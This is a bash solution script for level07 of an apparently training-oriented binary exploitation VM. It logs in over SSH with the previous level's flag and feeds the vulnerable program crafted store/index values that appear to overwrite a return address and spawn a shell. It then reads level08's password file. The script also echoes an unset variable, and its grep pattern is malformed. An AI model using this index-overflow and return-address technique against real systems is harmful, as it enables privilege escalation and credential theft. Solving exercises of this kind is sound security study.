#!/bin/bash

VM_ID='192.168.56.6'
if [ ! -z "$1" ]; then
    VM_ID="$1"
fi
ACTUAL_LEVEL=$(echo "$0" | grep --only --color=never --max-count=1 "level0[0-9].sh" | head --lines=1 | sed 's/.*level0\([0-9]\).sh.*/\1/g')

if [ -z "${ACTUAL_LEVEL}" ]; then
    echo "cannot get the level number of the actua level"
    exit 1
fi

if [ "$(basename $(pwd))" = "Ressources" ]; then
    cd ..
fi

if [ "$(basename $(pwd))" != "level0${ACTUAL_LEVEL}" ]; then
    echo "not in corresponding directory must be: level0${ACTUAL_LEVEL}"
    exit 1
fi

PREVIOUS_LEVEL="$(( "${ACTUAL_LEVEL}" - 1))"

if [ ! -f "../level0${PREVIOUS_LEVEL}/flag" ]; then
    echo "../level0${PREVIOUS_LEVEL}/flag does not exist"
    exit 1
fi

act_level_password=$(cat "../level0${PREVIOUS_LEVEL}/flag")

sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'echo -e "store\n4159090384\n2147483762\nstore\n4160264172\n116\nquit" > /tmp/level07_val; echo "cat /home/users/level08/.pass" > /tmp/level07_command' 2> /dev/null

echo "Enter command:"
echo "  cat /tmp/level07_val - /tmp/level07_command | ./level07 | grep -a -o '[0-9A-Za-Z]\{40\}'"
echo
echo "Then Ctrl-D"

sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 2> /dev/null

echo -e "FLAG:\n${flag}"
